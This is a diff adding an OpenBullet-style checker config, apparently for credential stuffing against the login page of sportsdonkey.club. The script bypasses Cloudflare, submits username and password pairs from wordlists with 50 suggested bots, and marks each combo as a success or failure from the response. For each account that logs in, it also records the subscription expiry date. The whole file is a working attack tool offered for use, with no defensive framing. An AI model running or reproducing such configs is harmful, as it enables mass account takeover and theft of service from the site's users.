@@ -1,0 +1,57 @@
+[SETTINGS]
+{
+  "Name": "SPORTSDONKEY",
+  "SuggestedBots": 50,
+  "LastModified": "2018-10-14T22:14:02.1425311+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+BYPASSCF "https://sportsdonkey.club/site/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+#REQUEST_PAGE REQUEST GET "https://sportsdonkey.club/site/login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_LOGIN_ATTEMPT_ID PARSE "<SOURCE>" CSS "[login_attempt_id]" "value" 0 -> VAR "LOGINID" "" "" 
+#POST_LOGIN REQUEST POST "https://sportsdonkey.club/site/login" AutoRedirect=TRUE 
+  CONTENT "amember_login=<USER>&amember_pass=<PASS>&login_attempt_id=<LOGINID>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: https://sportsdonkey.club" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Referer: https://sportsdonkey.club/site/login" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "ok\":true" 
+  KEYCHAIN Failure OR 
+    KEY "ok\":false" 
+REQUEST GET "http://sportsdonkey.club/site/member/index" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: https://sportsdonkey.club" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Referer: https://sportsdonkey.club/site/login" 
+#PARSE_EPIRATION PARSE "<SOURCE>" LR "            expires " " " Recursive=FALSE -> CAP "EXPIRES" "" "" 
